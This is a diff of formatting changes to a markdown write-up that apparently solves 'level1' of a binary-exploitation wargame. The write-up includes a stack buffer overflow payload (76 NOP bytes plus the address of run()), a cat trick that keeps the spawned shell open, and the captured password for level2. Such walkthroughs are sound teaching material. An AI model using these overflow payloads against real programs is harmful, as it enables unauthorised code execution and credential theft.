@@ -1,4 +1,4 @@
-a `level1` bin
+# level1
 
 upon running it wait for input from stdin
 
@@ -19,7 +19,8 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-look like it create a size 80 buffer 
+look like it create a size 80 buffer
+
 ```sh
 [...]
 0x08048486 <+6>:     sub    $0x50,%esp  
@@ -133,6 +134,7 @@ Program received signal SIGSEGV, Segmentation fault.
 and that's the end of the buffer
 
 so by adding adjusting the buffer and adding `run()` address
+
 ```sh
 python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
@@ -144,6 +146,7 @@ it seem that `run()` is call run but since the fd close from pipe the program ex
 ```sh
 cat <(python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"') - | ./level1
 ```
+
 ```sh
 Good... Wait what?
 ls
@@ -159,6 +162,3 @@ and we got level2
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
-
-
-
